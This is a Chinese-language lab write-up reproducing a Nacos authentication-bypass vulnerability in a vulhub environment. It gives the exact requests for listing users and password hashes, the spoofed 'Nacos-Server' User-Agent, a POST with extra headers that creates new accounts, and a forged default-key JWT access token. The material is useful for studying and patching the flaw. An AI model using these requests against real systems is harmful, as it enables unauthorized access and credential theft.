# Nacos权限绕过漏洞

## 简介

该漏洞发生在nacos在进行认证授权操作时，会判断请求的user-agent是否为"Nacos-Server"，如果是的话则不进行任何认证

开发者原意是用来处理一些服务端对服务端的请求

但是由于配置过于简单，并且将协商好的user-agent设置为Nacos-Server直接硬编码在了代码里，导致了漏洞的出现。

利用这个未授权漏洞，攻击者可以获取到用户名密码等敏感信息



## 影响版本

Nacos<=2.0.0-ALPHA.1



## 漏洞复现

本次利用vulhub复现

```
docker-compose up -d
```

![image-20250404222433394](./assets/image-20250404222433394.png)

![image-20250404222446565](./assets/image-20250404222446565.png)

环境运行后，会开放3306，8848，9848，9555端口

在本次漏洞利用中，我们只需要用到8848端口，即web服务



### 获取用户信息

访问

ip:8848/nacos/#/login

![image-20250404222641987](./assets/image-20250404222641987.png)



访问

```
http://192.168.1.3:8848/nacos/v1/auth/users?pageNo=1&pageSize=2
```

在访问的时候抓包，将UA修改为Nacos-Server

![image-20250404222808198](./assets/image-20250404222808198.png)

得到两个用户信息

其vulhub是环境自带的，crow是我第一次复现的时候加上的

以及密码的加密值



### 添加用户

访问

```
http://192.168.1.3:8848/nacos/v1/auth/users
```

然后修改数据包

将UA改为Nacos-Server

将请求方式改为POST

并POST传递username和password的值



但是好像有一点问题

当只做上述修改时，会出现500报错

![image-20250404223310993](./assets/image-20250404223310993.png)



但是如果加上

```
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Pragma: no-cache
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded
```

![image-20250404223435286](./assets/image-20250404223435286.png)

则成功创建用户



然后可以通过上面的payload获取用户的信息

```
http://192.168.1.3:8848/nacos/v1/auth/users?pageNo=1&pageSize=2
```

User-Agent:Nacos-Server

![image-20250404223609753](./assets/image-20250404223609753.png)



此时我们可以通过新加的用户登录

![image-20250404223722282](./assets/image-20250404223722282.png)













默认Key

payload

```
{
  "sub": "nacos",
  "exp":1679318378
}
```



```
/nacos/v1/auth/users?pageNo=1&pageSize=100&search=blur&accessToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3OTMxODM3OH0.RIYVwrgMhqTy_XmG6Ww2K9I40qAbarbfd4IQ3CD9HlM
```

